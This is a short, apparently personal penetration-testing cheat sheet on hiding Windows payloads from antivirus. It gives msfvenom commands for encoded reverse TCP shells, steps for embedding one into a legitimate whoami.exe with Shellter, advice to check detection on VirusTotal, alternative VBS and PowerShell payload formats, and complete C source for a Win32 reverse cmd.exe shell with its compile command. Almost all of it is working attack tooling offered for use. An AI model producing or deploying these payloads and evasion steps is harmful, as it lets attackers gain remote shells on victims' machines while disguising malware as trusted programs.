# Shellter & Custom C Payloads

If payloads get shot down by windows defender. We can create a payload and use shellter to hide it:

```bash
# generate payload again but in a raw format
msfvenom -p windows/shell_reverse_tcp \
         LHOST=$my-ip \
         LPORT=443 \
         â€“e x86/shikata_ga_nai \
         -i 9 \
         -a x86 \
         -f raw \
         -o pwn.bin
# install shellter 
sudo dpkg --add-architecture i386
sudo apt update
sudo apt -y install wine32 shellter
# copy over a normal windows binary
find / -iname whoami.exe 2>/dev/null
cp /usr/share/windows-resources/binaries/whoami.exe .
# start binary
sudo shellter
```

Then add the payload pwn.bin` into the binary `whoami.exe` with the following steps:

```bash
Operation mode - A

Pe target: /home/kali/Documents/whoami.exe

Enable stealth mode: N

Use listed payload or custom: C

Select payload: /home/kali/Documents/pwn.bin

Is this payload reflective dll: N
```

Now take the resulting `whoami.exe` and upload it to [https://www.virustotal.com](https://www.virustotal.com/) to test if it will pass:

If not, try some other msf venom formats:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -a x86 -f vba-exe -e x86/shikata_ga_nai -i 50 -o pwn.vbs

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -a x86 -f vbs -e x86/shikata_ga_nai -i 50 -o pwn.vbs

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -a x86 -f psh -e x86/shikata_ga_nai -i 50 -o pwn.ps1
```



<u>**Custom cmd.exe in c:**</u>

```c
/* Win32 TCP reverse cmd.exe shell
 * References:
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
 * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
 */
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define TARGET_IP   "10.10.14.17"
#define TARGET_PORT 6969

void main(void) {
  SOCKET s;
  WSADATA wsa;
  STARTUPINFO si;
  struct sockaddr_in sa;
  PROCESS_INFORMATION pi;

  WSAStartup(MAKEWORD(2,2), &wsa);
  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
  sa.sin_port = htons(TARGET_PORT);
  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
  SecureZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = (HANDLE)s;
  si.hStdOutput = (HANDLE)s;
  si.hStdError = (HANDLE)s;
  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}
```

```bash
# above C code is saved in bubba.c
sudo apt install mingw-w64 wine
i686-w64-mingw32-gcc pwn.c -o pwn.exe -s -lws2_32
```

